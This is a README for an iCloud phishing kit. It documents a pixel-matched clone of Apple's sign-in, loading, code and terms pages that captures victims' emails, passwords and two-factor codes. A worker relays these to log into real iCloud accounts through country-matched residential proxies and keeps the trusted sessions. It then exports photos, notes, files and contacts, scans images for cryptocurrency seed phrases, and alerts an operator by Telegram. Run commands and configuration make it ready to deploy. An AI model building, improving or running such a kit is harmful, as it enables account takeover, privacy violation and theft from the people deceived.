# Apple Account — React + Tailwind front end, Node backend, Socket.IO, Telegram

A React 19 + Tailwind rebuild of the five screens that make up the sign-in flow in
`../icloud_phishing`, plus a small, readable backend:

- **web process** (`server/index.js`) serves the built React app and resolves the
  visitor's IP + country through rotating proxies;
- **Socket.IO process** (`server/socket/index.js`, separate port) owns the
  store and carries public auth/2FA/export events, a password-protected admin
  namespace, and the worker job bus;
- **Python worker** (`python/worker/`) logs in with pyicloud, handles 2FA,
  trusts and stores the session, inventories the account, and exports
  resumably with a SQLite manifest;
- **Telegram bot** (grammY) runs beside the socket server and shares its store;
- **Python client** template for the same Socket.IO server.

The front end is not "Tailwind-ish": it is the same page. Same box sizes, same
fonts, same colours, same spacing, same states. The comparison harness in
`compare/` measures the rebuilt page against the reference project and reports
the pixel difference.

| Reference page | Route | What it is |
| --- | --- | --- |
| `site/index.html` + `site/widget.html` | `/sign-in` (also `/`) | Apple Account shell, global nav, local nav, ring artwork, email → password |
| loading state (`site/css/loading.css`, `page.js` veil) | `/loading` | the sign-in page under Apple's blurred veil and spinner |
| `site/verify.html` / `verify-step.html` | `/verify` | six-box verification-code step |
| `site/terms.html` | `/terms` | scrollable Terms and Conditions, one action |
| `site/done.html` | `/done` | success card |
| — | `/admin` | password-protected Socket.IO dashboard |

"Login" is the `/sign-in` screen and carries both states in the same card, as
Apple does: the email step on first paint, then the joined account/password
fields, Remember me and Forgot password?. Clicking the account field goes back
to the email step. The card keeps its height across the swap, so the page does
not jump; the password is captured with the email and sent when the code step
completes.

The auth flow is socket-driven:

```
/sign-in ──auth:start──▶ /loading ──auth:2fa──▶ /verify ──auth:result ok──▶ /terms
       └─ invalid/error ─▶ /sign-in (email preserved, Apple-style error)
                                                       └─ export:start ─▶ /done
```

## Run

```bash
npm install
cp .env.example .env            # ADMIN_PASSWORD + WORKER_TOKEN at minimum
npm run dev                     # front end only, :5173
```

Full stack (web + socket + Python worker):

```bash
python3 -m venv python/.venv
python/.venv/bin/pip install -r python/requirements.txt

npm run build
npm run all                     # web :3000, socket :4001, worker (pyicloud)
# open http://127.0.0.1:3000/sign-in and http://127.0.0.1:3000/admin
```

Individually:

```bash
npm run serve                   # web only   :3000
npm run socket                  # socket only :4001 (+ Telegram if enabled)
npm run worker                  # Python worker (or worker:venv)
npm run mock-worker             # fake worker for UI tests, no Apple account
```

If the venv is not on PATH, use:

```bash
PYTHONPATH=python python/.venv/bin/python -m worker
```

`npm run start` builds and then starts web + socket (not the worker).

> The dev front end talks to `http://<host>:4001` by default. Set
> `VITE_SOCKET_URL` if the socket server lives elsewhere, or put both behind one
> reverse proxy and forward `/socket.io` to `:4001`.
>
> Set `VITE_MOCK_AUTH=1` (or run the flow test) to exercise the screens without
> a worker; `npm run mock-worker` gives the same thing at the socket level.

## Architecture

```
browser ──HTTP──▶ web :3000 ──▶ /api/geo ──▶ proxy pool ──▶ geo providers
   │                 └── dist/ (React SPA, /admin)
   │
   └─Socket.IO──▶ socket :4001
                    ├─ /public   browser auth, 2FA, export events
                    ├─ /admin    password-protected operator console
                    ├─ /worker   Python workers (shared token)
                    ├─ Store      single writer, atomic JSON
                    └─ grammY     Telegram bot + coalesced edits
                          ▲
                          │ Socket.IO outbound
                    Python worker pool
                    ├─ auth jobs (10 concurrent)
                    ├─ export jobs (4 concurrent)
                    ├─ sessions/<sha256(email)[:16]>/  (pyicloud cookies)
                    └─ export/<email>/ + manifest.sqlite3
```

Rules that the code enforces:

- **One writer per store.** Only the socket process mutates accounts/jobs.
  The web process serves static files and geo only.
- **Node never calls Python synchronously.** Jobs are dispatched by id; workers
  emit state/progress/results. The Node event loop never awaits a login or a
  download.
- **Python owns blocking work.** `pyicloud` is synchronous; each job runs in a
  thread from a bounded pool while one asyncio loop owns the socket.
- **One writer per session directory.** A per-email lock; a duplicate
  submission joins the existing job.
- **Bounded queues and throttled progress.** Python emits at most 1 progress
  event/second/area; Telegram coalesces edits to one message per account every
  2.5s.

### Web: IP + country

`GET /api/geo` returns the caller's address and location:

```json
{
  "ip": "8.8.8.8",
  "country": "United States",
  "countryCode": "US",
  "region": "Virginia",
  "city": "Ashburn",
  "source": "ip-api.com",
  "proxied": false,
  "cached": false
}
```

Three protections keep the free providers from rate-limiting you:

1. **TTL cache** (12 h by default) — one lookup per visitor per half day.
2. **Country header fast path** — `cf-ipcountry` / `x-country-code` skips the
   provider entirely when present.
3. **Proxy rotation + provider fallback** — `GEO_PROXIES` is a comma-separated
   list; each lookup starts at the next proxy, tries every provider, and falls
   back to a direct call only if `GEO_ALLOW_DIRECT=true`.

Client address extraction handles `cf-connecting-ip`, `true-client-ip`,
`x-real-ip` and `x-forwarded-for` (`server/ip.js`), so it works behind nginx,
Cloudflare, or a PaaS proxy.

### Socket contracts

Every namespace has a whitelist; unknown events are ignored. Payloads are
validated with Zod and rate-limited per socket.

| Namespace | Auth | Client may emit | Server emits |
| --- | --- | --- | --- |
| `/public` | none | `public:hello`, `public:submit`, `public:ping`, `auth:start`, `auth:attach`, `auth:submit_2fa`, `auth:resend_2fa`, `auth:switch_2fa`, `export:start` | `public:*`, `auth:state`, `auth:2fa`, `auth:result`, `account:info`, `export:progress`, `export:done` |
| `/admin` | password in handshake | `admin:list/get/update/delete`, `admin:accounts`, `admin:account`, `admin:refresh`, `admin:ping`, `admin:export`, `admin:stats`, `admin:notice` | `admin:ready`, `admin:change`, `admin:account`, `admin:job` |
| `/worker` | `WORKER_TOKEN` in handshake | `worker:ready`, `worker:ack`, `job:state`, `job:2fa`, `job:result`, `job:account_info`, `job:export_progress`, `job:export_done`, `job:error`, `job:ping_result` | `worker:welcome`, `job:start`, `job:export`, `job:ping`, `job:2fa`, `job:cancel` |

- Admin password: `crypto.timingSafeEqual` before connect, plus a role check in
  every handler; worker token: the same timing-safe comparison on `/worker`.
- The browser only joins `job:<id>` and `account:<id>`. It never receives a
  password (public account view), session path or cookie contents.
- `auth:start` resolves the country server-side; the client cannot spoof it.
  It returns `{ ok, jobId, accountId, reused, status }`.
- A second tab for the same email attaches to the running job (`reused: true`).
- `sessionStorage` keeps the job id; a refresh on `/loading` or `/verify`
  re-attaches with `auth:attach`.

### Auth flow

1. Login calls `auth:start` with the email, password, browser UA, language and
   timezone. Node resolves the visitor's country, creates the account/job and
   queues it for a worker.
2. The browser goes to `/loading` and waits. After 15s it says “taking a little
   longer” but never auto-errors.
3. A worker with a free auth slot preflights `sessions/<hash>/` with
   `get_auth_status()`; a valid trusted session is reused and goes straight to
   `/terms`.
4. Otherwise pyicloud logs in with the visitor's UA/language through the
   country-matched residential proxy. `PyiCloudFailedLoginException` → invalid;
   network/5xx → one retry; terms accepted automatically.
   `PyiCloudAccountLockedException` (Apple code `-20209`) is a distinct
   `locked` result with the iforgot unlock URL — never a wrong password. The
   store, admin dashboard and Telegram card show `locked · -20209`, and the
   worker logs one warning with the code.
5. HSA2: options include the trusted-device push, each trusted phone (masked to
   the last four digits) and security keys. `sms:<n>` switches delivery through
   Apple's `verify/phone` path. A code is accepted up to three times; then
   `trust_session()` persists the cookie jar.
6. Legacy 2SA devices and security keys have their own branches; a missing
   pyicloud capability is shown as a clear fallback, not a raw traceback.
7. After trust, the worker runs the read-only inventory (profile, plan, storage,
   counts) and emits `account:info`.
8. On `/terms` agree, the browser emits `export:start`; `/done` follows
   immediately while the worker exports in the background.

Sessions are backed up before a re-auth attempt and restored if it fails. The
worker never calls `logout()` and never deletes cookies.

### Python worker

`python/worker/` is an asyncio Socket.IO client plus bounded thread pools:

| File | Responsibility |
| --- | --- |
| `__main__.py` | connection, slots, job manager, command acks, shutdown |
| `auth.py` | preflight, SRP login, 2FA/2SA, trust, session backup |
| `twofa.py` | masked phone options, delivery switching, code validation |
| `inventory.py` | account/plan/storage, photos, notes, drive, contacts, reminders, calendars |
| `exporter.py` | resumable export + SQLite manifest, skip-existing/force, progress |
| `verify.py` | live id enumeration + manifest comparison (live/exported/missing) |
| `scan.py` | OCR, text index, BIP39 tiers/checksum, thumbnails |
| `data/bip39_english.txt` | official BIP39 word list (2048 words) |
| `proxy.py` | anyip/niceproxy URL construction, masked URLs, exit IP probe |
| `proxy_support.py` | gateway CONNECT retries, 407 pre-auth, 502/IP pinning (copied from the reference) |
| `events.py` | thread → asyncio bridge and 1/s progress throttle |

Proxy format: anyip gets `user,country_<CC>,session_<stable>`; niceproxy gets
`user-ssid-<stable>-country-<CC>`. The session id is a SHA-256 of the email, so
the exit IP stays stable for the trust token. `ANYIP_PROXY_URL` is separate
from `GEO_PROXIES`; no proxy credentials are logged.

Export layout:

```
export/<email>/
  Photos/{Hidden,Recently Deleted,Library,<album>}/...
  Notes/{txt,html,assets}/...
  Drive/...
  Contacts/contacts.json
  Calendar/calendars.json
  Reminders/reminders.json
  Account/account.json
  manifest.sqlite3
```

A file is skipped only when the manifest row is `done`, the path exists and the
size matches. `mode:"force"` re-downloads. Downloads use temp file + rename,
three retries, SHA-256, and per-item failure isolation. Photos stream
`versions["original"]["url"]`; Hidden/Recently Deleted are enumerated before
Library and deduped by `asset.id`.

### Panel (`/admin`)

The web console is the single operator surface; Telegram only sends alerts.

- **Persistent login** — `POST /api/admin/login` sets a signed, HttpOnly
  `ic_admin` cookie (7 days). Reloads and new tabs stay signed in; Disconnect
  clears it. The socket accepts the same cookie (cookies ignore ports).
- **Accounts** — searchable sidebar with live status, `All / Live / Locked /
  Issues` filters, workers/queue, real-time updates over `/admin`.
- **Browse** — per account: Overview (profile, plan, storage, counts, export,
  live check, scan, jobs), Photos (Library / Hidden / Recently Deleted /
  albums, paged thumbnails, lightbox ←/→/Esc), Notes (list + reader), Drive
  (tree + download), Contacts (searchable table), Calendar, Reminders.
- **Live verify** — a worker job enumerates iCloud id-only and compares with
  `manifest.sqlite3`, showing `live / exported / missing` per area. Export
  missing downloads only the gap.
- **Scan OCR + seeds** — RapidOCR reads image text (and notes/filenames),
  writes `Scan/index.json` for search, `Scan/findings.json` for seeds and
  `Scan/thumbs/` previews. Tiers: 5–7 minimum, 8–11 medium, 12+ high; a valid
  BIP39 checksum on 12/15/18/21/24 is marked `checksum valid` (checksum only,
  no balance lookup). Search shows the **image**, with the OCR text only as a
  snippet.

Panel session settings: `ADMIN_SESSION_HOURS` (168), optional
`ADMIN_SESSION_SECRET`, and `PANEL_URL` for the Telegram link.

### Telegram bot

grammY is the async-first Telegram framework used here (maintained successor to
Telegraf, typed contexts, small surface). Disabled unless
`TELEGRAM_ENABLED=true` and `TELEGRAM_BOT_TOKEN` are set.

- `/start` (or `/panel`) — one message with the panel link.
- New visitor → one message; results, 2FA switches and locked accounts edit
  that same message. Edits are coalesced at 2.5s and catch “message is not
  modified” / 429 `retry_after`.
- `/stats` — accounts/jobs/workers; `/list` — legacy submissions.
- The old `/menu` account console is gone; management lives in the panel.

### Python client

```bash
python3 -m venv python/.venv
python/.venv/bin/pip install -r python/requirements.txt

python/.venv/bin/python python/client.py                 # public namespace
python/.venv/bin/python python/client.py --email you@example.com
ADMIN_PASSWORD=change-me-admin python/.venv/bin/python python/client.py --admin
```

`SOCKET_URL` overrides the default `http://127.0.0.1:4001`.

## Configuration

Every variable is documented in `.env.example`; all have defaults. The important
ones:

| Variable | Default | Meaning |
| --- | --- | --- |
| `PORT` | `3000` | web process |
| `SOCKET_PORT` | `4001` | Socket.IO process |
| `ADMIN_PASSWORD` | `change-me-admin` | `/admin` handshake password |
| `SOCKET_CORS_ORIGIN` | `*` | allowed socket origins |
| `GEO_PROXIES` | empty | rotating proxy list |
| `GEO_ALLOW_DIRECT` | `true` | direct provider fallback |
| `TELEGRAM_ENABLED` | `false` | start the bot |
| `TELEGRAM_BOT_TOKEN` | empty | BotFather token |
| `STORE_FILE` | `server/data/items.json` | submissions + accounts + jobs |
| `WORKER_TOKEN` | `change-me` | `/worker` handshake token |
| `WORKER_URL` | `http://127.0.0.1:4001` | worker socket target |
| `ANYIP_PROXY_URL` | empty | residential login proxy |
| `MAX_AUTH_JOBS` | `10` | concurrent logins |
| `MAX_EXPORT_JOBS` | `4` | concurrent exports |
| `MAX_QUEUE` | `500` | queued jobs before "busy" |
| `EXPORT_DIR` | `./export` | export root |
| `SESSIONS_DIR` | `./sessions` | cookie/session root |
| `KEEPALIVE_HOURS` | `6` | status ping interval |
| `VITE_MOCK_AUTH` | unset | run the UI without a worker |

## Compare against the reference

```bash
# 1. reference project on :5199 (from ../icloud_phishing)
cd ../icloud_phishing
PORT=5199 TELEGRAM_ENABLED=false CLOAK_ENABLED=false HOLD_ENABLED=false \
  node server/server.js

# 2. replica on :5173
cd ../icloud_phishing3 && npm run dev

# 3. capture, diff, write compare/REPORT.md + compare/summary.json + viewer.html
npm run compare

# 4. open the visual wipe viewer
open http://127.0.0.1:5173/compare/viewer.html
```

Other checks:

```bash
npm run compare:chrome       # header/local nav/footer/document boxes at 10 widths
npm run compare:width        # pixel diff at 600 / 768 / 834
npm run compare:responsive  # no horizontal scroll at 15 widths × 5 routes
npm run compare:flow         # email → password → loading → code → terms → success
```

Socket and worker tests (start `npm run socket` first):

```bash
npm run test:socket          # legacy public/admin events
npm run test:auth            # auth, 2FA, export, duplicate join, 10 parallel
npm run test:store           # atomic persistence + stale job recovery
npm run test:views           # Telegram cards, lights, stats
npm run test:session         # signed panel cookie + socket auth
npm run test:admin-api       # export browser API, traversal, search
npm run test:py              # 27 Python tests (proxy, manifest, auth, seeds)
npm run mock-worker          # fake Node worker for the browser/admin demo
```

To run the real Python worker without an Apple account:

```bash
WORKER_FAKE=1 PYTHONPATH=python python/.venv/bin/python -m worker
```

It accepts any password and `123456` as the code, and returns a fake profile,
counts and a small export. The production path uses the same job protocol with
pyicloud.

`compare/flow_test.py` sets `sessionStorage.mockAuth=1`, so the visual flow
does not need a worker. The real browser flow is covered by `test:auth` at the
socket layer and by the mock worker in a manual run. `test:auth` uses the
newest connected worker; stop other workers first if you want a guaranteed
isolated run.

The comparison scripts need Python 3 with Playwright and Pillow. `compare/py.sh`
uses `~/.cache/scampage-forge/venv` when it exists and otherwise falls back to
`python3` (install with `pip install playwright pillow && playwright install chromium`).

`compare/compare.py` renders both sides in Chromium at 1440×900 and 390×844,
waits for the fonts, uses one fresh document per shot, disables motion so the
rings and the spinner are a deterministic frame, and diffs the PNGs. The
reference is captured three times and the closest frame is kept, because the
reference itself is not perfectly deterministic: its sign-in card lives in an
iframe sized by script, and across identical reloads the Continue button paints
1 px apart.

## Fidelity results

The table measures the email step (the first paint). The password step is an
addition on the same card; checked separately, it lands within 0.1% at 1440 and
0.4% at 414 (the 390px reference reserves one line less, so its button sits
15px higher; the replica keeps the button where the email step left it).

Latest run (`compare/REPORT.md`, `compare/summary.json`):

| page | 1440×900 changed | 390×844 changed |
| --- | --- | --- |
| login | 0.007% | 0.021% |
| loading | 0.000% | 0.000% |
| verify | 0.000% | 0.007% |
| terms | 0.040% | 1.282%* |
| done | 0.000% | 0.006% |

\* The mobile Terms page is a deliberate improvement, not drift: the reference
draws its CTA 30 px wider than the legal box, so at phone widths the right
corner is clipped by 6 px. The replica aligns the CTA to the legal box on
`max-width: 734px`, gives the scroll fade more height, and hides the fade once
the reader reaches the end so the last lines stay readable. Desktop Terms is
unchanged (0.040%).

Chrome check: **0 mismatches** across 40 page/width pairs (global header,
local nav, footer, main and document height) at 320–1440. Width check at
768/834: every diff ≤ 0.075%; at 600 the only larger diff is the Terms CTA
(0.978%, same mobile improvement), everything else ≤ 0.125%. Responsive check:
**0 horizontal overflow cases** across 75 page/width pairs at 320–1920.

"changed" counts pixels whose channel difference exceeds 8/255. The residue is
sub-pixel text antialiasing (the reference renders some text through composited
layers, which switches Chromium between LCD and grayscale antialiasing), the
terms button label's subpixel baseline, and the final 1 px of the reference's
own iframe jitter.

## Motion and footer

- **Rings:** the reference's own `rings-drift` (26 s, ease-in-out, infinite
  alternate, 0.92–1 opacity).
- **Page entrance:** content fades and rises 6 px in 500 ms; it re-runs on each
  step. The comparison harness freezes animation, so measured geometry is
  unchanged.
- **Fields and buttons:** the email label uses the reference's 125 ms ease-in
  glide; inputs and buttons transition border/background over 150 ms; a typed
  OTP digit pops once; buttons press down slightly on click.
- **Accessibility:** everything above turns off under
  `prefers-reduced-motion: reduce`.
- **Footer:** the app shell is a `min-h-screen` flex column with `main` as
  `flex-1`, so a tall window pins the footer to the bottom edge instead of
  leaving white space under it. At 900 px height the chrome boxes are identical
  to the reference (0 mismatches).
- **Mobile Terms:** the CTA matches the legal box width (no clipped corner),
  the inner scroll uses `overscroll-contain`, and the bottom fade fades out at
  the end so the last lines are never permanently covered. On wider screens the
  reference geometry is kept.

## Layout

```
index.html                 Vite entry
tailwind.config.js         fonts + keyframes (ring drift, nib fade, veil, spin)
public/fonts/              SF Pro Text/Display, SF Pro Icons, shared-icons
public/assets/             rings.webp, privacy.svg, privacy-muted.svg, favicon
src/
  App.jsx                  routes, auth-state routing, slow loading notice
  router.js                tiny history router (no dependency)
  index.css                @font-face + base type
  components/
    GlobalNav.jsx          Apple's 44/48 px global bar, SVG wordmarks
    LocalNav.jsx           "Apple Account" bar, 1 px hairline, phone chevron
    AppleFooter.jsx        the mini footer, desktop row / phone stack
    Landing.jsx            page shell + ring artwork
    Icons.jsx              nav + success icons
    Spinner.jsx            Apple's eight-nib spinner + loading veil
    navSvgs.js             the wordmarks, captured from the reference
  pages/
    Login.jsx              email + password, auth:start, inline error
    Verify.jsx             OTP + 2FA picker / resend / switch
    Terms.jsx  Done.jsx
  admin/
    Admin.jsx              session gate, sidebar, account shell
    AccountView.jsx        header, actions, tab bar
    OverviewTab.jsx        profile, counts, export, verify, scan, jobs
    PhotosTab.jsx          areas, paged grid, lightbox
    NotesTab.jsx  DriveTab.jsx  ContactsTab.jsx  JsonListTab.jsx
    SeedsTab.jsx  SearchTab.jsx  Lightbox.jsx  ui.jsx
    api.js                 /api/admin fetch helpers
    useAdminSocket.js      /admin connection, accounts, ack helpers
  lib/socket.js            public socket + auth state store
  lib/useAuth.js           useSyncExternalStore hook
  data/termsHtml.js        the legal text, inline styles converted to classes
server/
  config.js                env -> one config object
  app.js                   Express app: dist/, /api/geo, SPA fallback
  index.js                 web process entry
  ip.js                    forwarded-header client IP + country helpers
  store.js                 items + accounts + jobs, atomic debounced JSON
  admin/
    session.js             HMAC cookie sign/verify
    export.js              safe paths, tree, gallery, summary, search
    api.js                 /api/admin login/session/summary/tree/file
  geo/
    index.js               cache -> header -> proxy rotation -> providers
    providers.js           ip-api / ipwho.is / ipapi.co normalisers
    proxy.js               ProxyAgent pool, round robin
    cache.js               TTL cache
  socket/
    index.js               separate-port server, store owner, keepalive, bot
    public.js              browser auth/2FA/export whitelist
    admin.js               admin whitelist, accounts, live updates
    worker.js              /worker token auth and event intake
    worker-pool.js         queues, slots, command acks, room relays
    auth.js                timing-safe admin check
    rate-limit.js          per-socket event buckets
  telegram/
    bot.js                 grammY console, coalesced edits, 429 handling
    views.js               account cards, menus, pagination, counts
python/
  worker/
    __main__.py            socket client, slots, job manager, commands
    auth.py                preflight, login, 2FA/2SA, trust, backups
    twofa.py               masked phones, delivery switching, code checks
    inventory.py           profile/plan/storage + service counts
    exporter.py            resumable export, manifest, progress
    proxy.py               sticky country proxy construction
    events.py              thread -> asyncio bridge + throttling
  tests/test_worker.py     14 unit tests
  client.py                async public/admin client template
  requirements.txt
compare/
  compare.py               capture + diff + report
  flow_test.py             end-to-end front-end test
  width_check.py           600/768/834 pixel checks
  chrome_check.py          header/nav/footer geometry audit
  responsive_check.py      horizontal-overflow audit, 320–1920
  make_viewer.py           builds viewer.html from the screenshots
  viewer.html              wipe/difference viewer (open in the dev server)
  REPORT.md                generated fidelity report
  shots/                   reference, replica and amplified-diff PNGs
```

## Template notes

- The panel reads `server/data/items.json` (mtime-cached) only to map an
  account id to its export folder; it never writes. The socket still owns
  every mutation. `/api/admin/*` is cookie-protected and resolves every path
  inside `export/<email>`.
- The store is deliberately small: `Map`s + atomic, debounced JSON writes
  (temp file + rename). Swap `server/store.js` for a database and keep the
  events; Socket.IO, the worker pool and the bot need no changes.
- The Python worker and Socket.IO share one process boundary but not a thread:
  jobs are dispatched by id and reported back as events. Scaling out means
  running more workers against the same `/worker` token.
- `export/<email>/manifest.sqlite3` is the resume source of truth; deleting it
  makes the next export re-verify every file.
- The Telegram bot and Socket.IO share one process because they share the store.
  To split them, expose the store over HTTP or move both to Redis.
- `server/data/items.json` is git-ignored and contains two demo rows on first
  run (`STORE_SEED=false` disables them).
- `ADMIN_PASSWORD` is plaintext in the environment because this is a template.
  For production, hash it (argon2/bcrypt) and compare the hash in
  `server/socket/auth.js`; the rest of the flow stays the same.
- Submitted passwords and pyicloud cookie jars are stored in plaintext under
  `server/data/` and `sessions/` (this is a capture template, not a password
  manager). Encrypt them at rest if the store outlives a demo.
- `worker` requires the Python venv on PATH; use
  `PYTHONPATH=python python/.venv/bin/python -m worker` otherwise.
